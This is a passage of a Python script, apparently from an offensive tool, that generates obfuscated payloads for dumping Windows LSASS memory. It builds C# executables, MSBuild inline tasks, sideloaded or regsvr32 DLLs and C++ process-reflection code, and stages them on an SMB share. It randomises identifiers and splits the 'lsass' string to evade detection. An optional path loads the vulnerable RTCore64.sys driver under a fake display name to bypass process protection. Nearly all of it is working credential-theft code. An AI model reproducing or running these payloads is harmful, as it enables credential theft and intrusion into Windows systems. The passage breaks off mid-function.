    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithFullMemory)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithHandleData)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithThreadInfo)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithFullMemoryInfo)
    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithProcessThreadData)
    exe_payload += '                                    %s.%s;\n' % (MINIDUMP_TYPE, MiniDumpWithModuleHeaders)

    exe_payload += '                %s = MiniDumpWriteDump(%s, %s, %s.SafeFileHandle.DangerousGetHandle(), %s, IntPtr.Zero, IntPtr.Zero, %s);\n' % (hresult, sHandle, processid, file, MFlag, CbackParam)

    exe_payload += '                IntPtr %s;\n' % (VcHandle)
    exe_payload += '                PssQuerySnapshot(%s, %s.%s, out %s, IntPtr.Size);\n' % (sHandle, PSS_QUERY_INFORMATION_CLASS, PSS_QUERY_VA_CLONE_INFORMATION, VcHandle)

    exe_payload += '                var %s = GetProcessId(%s);\n' % (cloneProid, VcHandle)

    exe_payload += '                PssFreeSnapshot(Process.GetCurrentProcess().Handle, %s);\n' % (sHandle)
    exe_payload += '                CloseHandle(%s);\n' % (VcHandle)

    exe_payload += '                try\n'
    exe_payload += '                {\n'
    exe_payload += '                    Process.GetProcessById(%s).Kill();\n' % (cloneProid)
    exe_payload += '                }\n'
    exe_payload += '                catch (Win32Exception)\n'
    exe_payload += '                {\n'
    exe_payload += '                }\n'

    exe_payload += '                Marshal.FreeHGlobal(%s);\n' % (CbackParam)
    exe_payload += '                GC.KeepAlive(%s);\n' % (CbackDelegate)

    exe_payload += '                if (%s == 0)\n' % (hresult)
    exe_payload += '                {\n'
    exe_payload += '                    Console.WriteLine("MiniDumpWriteDump failed. ({Marshal.GetHRForLastWin32Error()})");\n'
    exe_payload += '                    return %s;\n' % (hresult)
    exe_payload += '                }\n'
    exe_payload += '            }\n'

    exe_payload += '            return 0;\n'
    exe_payload += '        }\n'
    exe_payload += '    }\n'
    exe_payload += '}\n'

    with open('/var/tmp/{}/pl.cs'.format(share_name), 'w') as f:
        f.write(exe_payload)
        f.close()

    os.system('sudo mcs -out:/var/tmp/{}/{}.exe /var/tmp/{}/pl.cs -unsafe'.format(share_name, payload_name, share_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/{}.exe'.format(share_name, payload_name))

    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()


def gen_payload_dllsideload_pss(share_name, addresses_array):
    # copy calc.exe to our smb share
    os.system('sudo cp {}/src/calc /var/tmp/{}/calc.exe'.format(cwd, share_name))
    # allow anyone to run calc.exe
    os.system('sudo chmod uog+rx /var/tmp/{}/calc.exe'.format(share_name))

    # copy the dllpaylodpss to the smb share as WindowsCodecs.dll
    os.system('sudo cp {}/src/dllpayloadpss /var/tmp/{}/WindowsCodecs.dll'.format(cwd, share_name))
    # allow anyone to use it
    os.system('sudo chmod uog+rx /var/tmp/{}/WindowsCodecs.dll'.format(share_name))

    # make our address.txt file a static name since we cant compile the dllpayloads and this method does not allow us to give any input
    with open('/var/tmp/{}/address.txt'.format(share_name), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()


def gen_payload_regsvr32_pss(share_name, payload_name, addresses_array):
    # make a random name for the address file
    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))

    # copy the dllpaylodpss to the smb share as whatever payload_name is
    os.system('sudo cp {}/src/dllpayloadpss /var/tmp/{}/{}.dll'.format(cwd, share_name, payload_name))
    # allow anyone to use it
    os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, payload_name))

    # write the addresses to addresses_file
    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()

    return addresses_file


def gen_payload_dllsideload_mdwd(share_name, addresses_array):
    # copy calc.exe to our smb share
    os.system('sudo cp {}/src/calc /var/tmp/{}/calc.exe'.format(cwd, share_name))
    # allow anyone to run calc.exe
    os.system('sudo chmod uog+rx /var/tmp/{}/calc.exe'.format(share_name))

    # copy the dllpaylodmdwd to the smb share as WindowsCodecs.dll
    os.system('sudo cp {}/src/dllpayloadmdwd /var/tmp/{}/WindowsCodecs.dll'.format(cwd, share_name))
    # allow anyone to use it
    os.system('sudo chmod uog+rx /var/tmp/{}/WindowsCodecs.dll'.format(share_name))

    # make our address.txt file a static name since we cant compile the dllpayloads and this method does not allow us to give any input
    with open('/var/tmp/{}/address.txt'.format(share_name), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()


def gen_payload_regsvr32_mdwd(share_name, payload_name, addresses_array):
    # make a random name for the address file
    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))

    # copy the dllpaylodpss to the smb share as whatever payload_name is
    os.system('sudo cp {}/src/dllpayloadmdwd /var/tmp/{}/{}.dll'.format(cwd, share_name, payload_name))
    # allow anyone to use it
    os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, payload_name))

    #write the addresses_array to addresses_file in the smb share
    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()

    return addresses_file


def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array, runasppl):
    targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    taskname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithFullMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithHandleData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithThreadInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithTokenInformation = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
    filename = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    fs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    bRet = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    dumpTyp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    prochandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    procid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    Dump = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    GetMyPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    myprocesses = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    myprocess = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    myid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    GetPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    processes = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    id = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    process = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    IsAdministrator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
    p = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    l = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    lines = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    RunAsPPLDll = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    ipEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    ip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    i = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    thismachinesip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))

    xml_payload = "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n"
    xml_payload += "<!-- C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe SimpleTasks.csproj -->\n"
    xml_payload += "	<Target Name=\"%s\">\n" % (targetname)
    xml_payload += "            <%s />\n" % (taskname)
    xml_payload += "          </Target>\n"
    xml_payload += "          <UsingTask\n"
    xml_payload += "            TaskName=\"%s\"\n" % (taskname)
    xml_payload += "            TaskFactory=\"CodeTaskFactory\"\n"
    xml_payload += "            AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" >\n"
    xml_payload += "            <Task>\n"

    xml_payload += "              <Code Type=\"Class\" Language=\"cs\">\n"
    xml_payload += "              <![CDATA[\n"
    xml_payload += "using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; using System.IO; using System.Linq;\n"
    xml_payload += "public class %s : Task, ITask {\n" % (taskname)
    xml_payload += "		public enum Typ : uint\n"
    xml_payload += "        {\n"
    xml_payload += "            %s = 0x00000001,\n" % (MiniDumpWithDataSegs)
    xml_payload += "            %s = 0x00000002,\n" % (MiniDumpWithFullMemory)
    xml_payload += "            %s = 0x00000004,\n" % (MiniDumpWithHandleData)
    xml_payload += "            %s = 0x00001000,\n" % (MiniDumpWithThreadInfo)
    xml_payload += "            %s = 0x00040000,\n" % (MiniDumpWithTokenInformation)
    xml_payload += "        };\n"
    if runasppl:
        xml_payload += "        [System.Runtime.InteropServices.DllImport(@\"%s:\\\\%s.dll\", EntryPoint = \"runninit\", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]\n" % (drive_letter, RunAsPPLDll)
        xml_payload += "        static extern void runninit(string argus);\n"

    xml_payload += "        [System.Runtime.InteropServices.DllImport(\"dbghelp.dll\",\n"
    xml_payload += "              EntryPoint = \"MiniDumpWriteDump\",\n"
    xml_payload += "              CallingConvention = CallingConvention.StdCall,\n"
    xml_payload += "              CharSet = CharSet.Unicode,\n"
    xml_payload += "              ExactSpelling = true, SetLastError = true)]\n"
    xml_payload += "        static extern bool MiniDumpWriteDump(\n"
    xml_payload += "              IntPtr hProcess,\n"
    xml_payload += "              uint processId,\n"
    xml_payload += "              IntPtr hFile,\n"
    xml_payload += "              uint dumpType,\n"
    xml_payload += "              IntPtr expParam,\n"
    xml_payload += "              IntPtr userStreamParam,\n"
    xml_payload += "              IntPtr callbackParam);\n"

    xml_payload += "        public static bool %s(string %s, Typ %s, IntPtr %s, uint %s)\n" % (Dump, filename, dumpTyp, prochandle, procid)
    xml_payload += "        {\n"
    xml_payload += "            using (var %s = new System.IO.FileStream(%s, System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))\n" % (fs, filename)
    xml_payload += "            {\n"
    xml_payload += "                bool %s = MiniDumpWriteDump(\n" % (bRet)
    xml_payload += "                  %s,\n" % (prochandle)
    xml_payload += "                  %s,\n" % (procid)
    xml_payload += "                  %s.SafeFileHandle.DangerousGetHandle(),\n" % (fs)
    xml_payload += "                  (uint)%s,\n" % (dumpTyp)
    xml_payload += "                  IntPtr.Zero,\n"
    xml_payload += "                  IntPtr.Zero,\n"
    xml_payload += "                  IntPtr.Zero);\n"
    xml_payload += "                if (!%s)\n" % (bRet)
    xml_payload += "                {\n"
    xml_payload += "                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n"
    xml_payload += "                }\n"
    xml_payload += "                return %s;\n" % (bRet)
    xml_payload += "            }\n"
    xml_payload += "        }\n"

    if runasppl:
        xml_payload += "        public static int %s() {\n" % (GetMyPID)
        xml_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ProcessName);\n" % (myprocesses)
        xml_payload += "            var %s = 0;\n" % (myid)
        xml_payload += "            foreach (var %s in %s)\n" % (myprocess, myprocesses)
        xml_payload += "            {\n"
        xml_payload += "                %s = %s.Id;\n" % (myid, myprocess)
        xml_payload += "            }\n"

        xml_payload += "            return %s;\n" % (myid)
        xml_payload += "        }\n"

    xml_payload += "        public static int %s() {\n" % (GetPID)
    xml_payload += "            string %s = \"s\";\n" % (s)
    xml_payload += "            string %s = \"l\";\n" % (l)
    xml_payload += "            string %s = \"a\";\n" % (a)
    xml_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(%s + %s + %s + %s + %s);\n" % (processes, l, s, a, s, s)
    xml_payload += "            var %s = 0;\n" % (id)
    xml_payload += "            foreach (var %s in %s)\n" % (process, processes)
    xml_payload += "            {\n"
    xml_payload += "                %s = %s.Id;\n" % (id, process)
    xml_payload += "            }\n"

    xml_payload += "            return %s;\n" % (id)
    xml_payload += "        }\n"

    xml_payload += "        public static bool %s()\n" % (IsAdministrator)
    xml_payload += "        {\n"
    xml_payload += "            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))\n"
    xml_payload += "                      .IsInRole(WindowsBuiltInRole.Administrator);\n"
    xml_payload += "        }\n"

    xml_payload += "        public override bool Execute()\n"
    xml_payload += "		{\n"
    xml_payload += "            if (%s())\n" % (IsAdministrator)
    xml_payload += "            {\n"
    xml_payload += "                var %s = System.IO.File.ReadLines(\"%s:\\\\%s.txt\").ToArray();\n" % (lines, drive_letter, addresses_file)
    xml_payload += "                string %s = \"\";\n" % (thismachinesip)
    xml_payload += "                var %s = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());\n" % (ipEntry)
    xml_payload += "                foreach (var %s in %s.AddressList)\n" % (ip, ipEntry)
    xml_payload += "                {\n"
    xml_payload += "                    for (int %s = 0; %s < %s.Length; %s++)\n" % (i, i, lines, i)
    xml_payload += "                    {\n"
    xml_payload += "                        if (%s.ToString() == %s[%s].ToString())\n" % (ip, lines, i)
    xml_payload += "                        {\n"
    xml_payload += "                            %s = \"-\" + %s.ToString();\n" % (thismachinesip, ip)
    xml_payload += "                        }\n"
    xml_payload += "                    }\n"
    xml_payload += "                }\n"
    if runasppl:
        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe create RTCore64 type=kernel start=auto binPath=%s:\\\\RTCore64.sys DisplayName=\\\"Micro - Star MSI Afterburner\\\"\").WaitForExit();\n" % (drive_letter)
        xml_payload += "                Thread.Sleep(1000);\n"
        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"net start RTCore64\").WaitForExit();\n"
        xml_payload += "                Thread.Sleep(1000);\n"
        xml_payload += "                runninit(%s().ToString());\n" % (GetMyPID)
        xml_payload += "                Thread.Sleep(1000);\n"

    xml_payload += "                string filePath = \"%s:\\\\\" + System.Net.Dns.GetHostName() + %s + \".dmp\";\n" % (drive_letter, thismachinesip)
    xml_payload += "                Process %s = Process.GetProcessById(%s());\n" % (p, GetPID)
    xml_payload += "                %s(filePath, (Typ.%s | Typ.%s | Typ.%s | Typ.%s | Typ.%s), %s.Handle, (uint)%s.Id);\n" % (Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p)
    if runasppl:
        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"net stop RTCore64\").WaitForExit();\n"
        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe delete RTCore64\").WaitForExit();\n"

    xml_payload += "            }\n"
    xml_payload += "			return true;\n"
    xml_payload += "        }}\n"
    xml_payload += "                                ]]>\n"
    xml_payload += "                        </Code>\n"
    xml_payload += "                </Task>\n"
    xml_payload += "        </UsingTask>\n"
    xml_payload += "</Project>"

    with open('/var/tmp/{}/{}.xml'.format(share_name, payload_name), 'w') as f:
        f.write(xml_payload)
        f.close()
    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()

    if runasppl: # if we are running as runasppl copy the dll and rtcode64.sys to the smb share
        os.system('sudo cp {}/src/runasppldll /var/tmp/{}/{}.dll'.format(cwd, share_name, RunAsPPLDll))
        os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, RunAsPPLDll))

        os.system('sudo cp {}/src/RTCore64.sys /var/tmp/{}/RTCore64.sys'.format(cwd, share_name))
        os.system('sudo chmod uog+rx /var/tmp/{}/RTCore64.sys'.format(share_name))


def gen_payload_exe_rtlcp(share_name, payload_name, drive_letter, runasppl):
    load_RtlCreateProcessReflection = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    lib = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    proc = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    refl_creator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    lpParam = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    args = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    ret = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    convertCharArrayToLPCWSTR = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    charArray = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    wString = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    hToken = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    tokenPriv = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    luid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    lsassPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    lsassHandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    snapshot = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    processEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    processName = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    outFile = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    retd = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    info = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    res = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    compname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    compname_len = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    one = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    twp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    lsass_processname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    processnamesd = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    szName = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    l = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    e = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    x = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    period = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    s1 = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    runninit = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    sAbout = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
    runasppldllname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))

    exe_payload = ''
    exe_payload += '#include <windows.h>\n'
    exe_payload += '#include <iostream>\n'
    exe_payload += '#include <dbghelp.h>\n'
    exe_payload += '#include <processsnapshot.h>\n'
    exe_payload += '#include <tlhelp32.h>\n'
    exe_payload += '#include <processthreadsapi.h>\n'
    exe_payload += '#include <lmcons.h>\n'
    if runasppl:
        exe_payload += '#include <process.h>\n'
        exe_payload += '#include <chrono>\n'
        exe_payload += '#include <thread>\n'
    exe_payload += '#include <sstream>\n'
    exe_payload += '\n'
    exe_payload += '#pragma comment (lib, "Dbghelp.lib")\n'
    exe_payload += '#pragma comment (lib, "Advapi32.lib")\n'
    exe_payload += '\n'
    exe_payload += 'using namespace std;\n'
    exe_payload += '#define USE_RTL_PROCESS_REFLECTION\n'
    exe_payload += '\n'
    exe_payload += '#ifndef RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED\n'
    exe_payload += '#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001\n'
    exe_payload += '#endif\n'
    exe_payload += '\n'
    exe_payload += '#ifndef RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES\n'
    exe_payload += '#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002\n'
    exe_payload += '#endif\n'
    exe_payload += '\n'
    exe_payload += '#ifndef RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE\n'
    exe_payload += '#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004 // dont update synchronization objects\n'
    exe_payload += '#endif\n'
    exe_payload += '\n'
    exe_payload += '#ifndef HPSS\n'
    exe_payload += '#define HPSS HANDLE\n'
    exe_payload += '#endif\n'
    exe_payload += '\n'
    exe_payload += 'const DWORD reflection_access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE;\n'
    exe_payload += '\n'
    exe_payload += 'typedef HANDLE HPSS;\n'
    exe_payload += '\n'
    exe_payload += 'typedef struct  {\n'
    exe_payload += '    HANDLE UniqueProcess;\n'
    exe_payload += '    HANDLE UniqueThread;\n'
    exe_payload += '} T_CLIENT_ID;\n'
    exe_payload += '\n'
    exe_payload += 'typedef struct\n'
    exe_payload += '{\n'
    exe_payload += '    HANDLE ReflectionProcessHandle;\n'
    exe_payload += '    HANDLE ReflectionThreadHandle;\n'
    exe_payload += '    T_CLIENT_ID ReflectionClientId;\n'
    exe_payload += '} T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION;\n'
    exe_payload += '\n'
    exe_payload += '// Win >= 7\n'
    exe_payload += 'NTSTATUS (NTAPI *_RtlCreateProcessReflection) (\n'
    exe_payload += '    HANDLE ProcessHandle,\n'
    exe_payload += '    ULONG Flags,\n'
    exe_payload += '    PVOID StartRoutine,\n'
    exe_payload += '    PVOID StartContext,\n'
    exe_payload += '    HANDLE EventHandle,\n'
    exe_payload += '    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION* ReflectionInformation\n'
    exe_payload += ') = NULL;\n'
    exe_payload += '\n'
    exe_payload += '// Win >= 8.1\n'
    exe_payload += '\n'
    exe_payload += 'bool %s()\n' % (load_RtlCreateProcessReflection)
    exe_payload += '{\n'
    exe_payload += '    if (_RtlCreateProcessReflection == NULL) {\n'
    exe_payload += '        HMODULE %s = LoadLibraryA("ntdll.dll");\n' % (lib)
    exe_payload += '        if (!%s) return false;\n' % (lib)
    exe_payload += ''
    exe_payload += '        FARPROC %s = GetProcAddress(%s, "RtlCreateProcessReflection");\n' % (proc, lib)
    exe_payload += '        if (!%s) return false;\n' % (proc)
    exe_payload += ''
    exe_payload += '        _RtlCreateProcessReflection = (NTSTATUS(NTAPI *) (\n'
    exe_payload += '            HANDLE,\n'
    exe_payload += '            ULONG,\n'
    exe_payload += '            PVOID,\n'
    exe_payload += '            PVOID,\n'
    exe_payload += '            HANDLE,\n'
    exe_payload += '            T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION*\n'
    exe_payload += '        )) %s;\n' % (proc)
    exe_payload += '\n'
    exe_payload += '    }\n'
    exe_payload += '    if (_RtlCreateProcessReflection == NULL) return false;\n'
    exe_payload += '    return true;\n'
    exe_payload += '}\n'
    exe_payload += '\n'
    exe_payload += 'typedef struct {\n'
    exe_payload += '    HANDLE orig_hndl;\n'
    exe_payload += '    HANDLE returned_hndl;\n'
    exe_payload += '    DWORD returned_pid;\n'
    exe_payload += '    bool is_ok;\n'
    exe_payload += '} t_refl_args;\n'
    exe_payload += '\n'
    exe_payload += 'DWORD WINAPI %s(LPVOID %s)\n' % (refl_creator, lpParam)
    exe_payload += '{\n'
    exe_payload += '    t_refl_args *%s = static_cast<t_refl_args*>(%s);\n' % (args, lpParam)
    exe_payload += '    if (!%s) {\n' % (args)
    exe_payload += '        return !S_OK;\n'
    exe_payload += '    }\n'
    exe_payload += '    %s->is_ok = false;\n' % (args)
    exe_payload += '\n'
    exe_payload += '    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION %s = { 0 };\n' % (info)
    exe_payload += '    NTSTATUS %s = _RtlCreateProcessReflection(%s->orig_hndl, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL, NULL, &%s);\n' % (ret, args, info)
    exe_payload += '    if (%s == S_OK) {\n' % (ret)
    exe_payload += '        %s->is_ok = true;\n' % (args)
    exe_payload += '        %s->returned_hndl = %s.ReflectionProcessHandle;\n' % (args, info)
    exe_payload += '        %s->returned_pid = (DWORD)%s.ReflectionClientId.UniqueProcess;\n' % (args, info)
    exe_payload += '    }\n'
    exe_payload += '    else{\n'
    exe_payload += '        printf("error: %d\\n", GetLastError());\n'
    exe_payload += '    }\n'
    exe_payload += '    return %s;\n' % (ret)
    exe_payload += '}\n'
    exe_payload += '\n'
    exe_payload += 'wchar_t *%s(const char* %s)\n' % (convertCharArrayToLPCWSTR, charArray)
    exe_payload += '{\n'
    exe_payload += '    wchar_t* %s=new wchar_t[4096];\n' % (wString)
    exe_payload += '    MultiByteToWideChar(CP_ACP, 0, %s, -1, %s, 4096);\n' % (charArray, wString)
    exe_payload += '    return %s;\n' % (wString)
    exe_payload += '}\n'
    exe_payload += '\n'
    if runasppl:
        exe_payload += 'typedef void(WINAPI *%s)(int);\n' % (runninit)
    exe_payload += 'int main(){\n'
    if runasppl:
        exe_payload += '    system("copy %s:\\\\RTCore64.sys C:\\\\Windows\\\\Temp");\n' % (drive_letter)
        exe_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(2000));\n'
        exe_payload += '    system("sc.exe create RTCore64 type=kernel start=auto binPath=C:\\\\Windows\\\\Temp\\\\RTCore64.sys DisplayName=\\\"Micro - Star MSI Afterburner\\\"");\n'
        exe_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(1000));\n'
        exe_payload += '    system("net start RTCore64");\n'
        exe_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(3000));\n'
        exe_payload += '    HMODULE %s = LoadLibrary(TEXT("%s.dll"));\n' % (s1, runasppldllname)
        exe_payload += '    %s %s = (%s)GetProcAddress(%s, "freethecat");\n' % (runninit, sAbout, runninit, s1)
        exe_payload += '    %s(_getpid());\n' % (sAbout)
        exe_payload += '    FreeLibrary(%s);\n' % (s1)
    exe_payload += '    HANDLE %s;\n' % (hToken)
    exe_payload += '    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &%s);\n' % (hToken)
    exe_payload += '    TOKEN_PRIVILEGES %s;\n' % (tokenPriv)
    exe_payload += '    LUID %s;\n' % (luid)
    exe_payload += '    LookupPrivilegeValue(NULL, "SeDebugPrivilege", &%s);\n' % (luid)
    exe_payload += '    %s.PrivilegeCount = 1;\n' % (tokenPriv)
    exe_payload += '    %s.Privileges[0].Luid = %s;\n' % (tokenPriv, luid)
    exe_payload += '    %s.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n' % (tokenPriv)
    exe_payload += '    AdjustTokenPrivileges(%s, FALSE, &%s, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL);\n' % (hToken, tokenPriv)
    exe_payload += '\n'
    exe_payload += '    DWORD %s = 0;\n' % (lsassPID)
    exe_payload += '    HANDLE %s = NULL;\n' % (lsassHandle)
    exe_payload += '    HANDLE %s = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n' % (snapshot)
    exe_payload += '    PROCESSENTRY32 %s = {};\n' % (processEntry)
    exe_payload += '    %s.dwSize = sizeof(PROCESSENTRY32);\n' % (processEntry)
    exe_payload += '    LPCWSTR %s = L"";\n' % (processName)
    exe_payload += '    string %s = "l";\n' % (l)
    exe_payload += '    string %s = "s";\n' % (s)
    exe_payload += '    string %s = "a";\n' % (a)
    exe_payload += '    string %s = "e";\n' % (e)
    exe_payload += '    string %s = "x";\n' % (x)
    exe_payload += '    string %s = ".";\n' % (period)
    exe_payload += '    string %s = %s + %s + %s +%s + %s + %s + %s + %s + %s;\n' % (lsass_processname, l, s, a, s, s, period, e, x, e)
    exe_payload += '    std::wstring %s(%s.begin(), %s.end());\n' % (processnamesd, lsass_processname, lsass_processname)
    exe_payload += '    const wchar_t* %s = %s.c_str();\n' % (szName, processnamesd)
    exe_payload += '    if (Process32First(%s, &%s)) {\n' % (snapshot, processEntry)
    exe_payload += '        while (_wcsicmp(%s, %s) != 0) {\n' % (processName, szName)
    exe_payload += '            Process32Next(%s, &%s);\n' % (snapshot, processEntry)
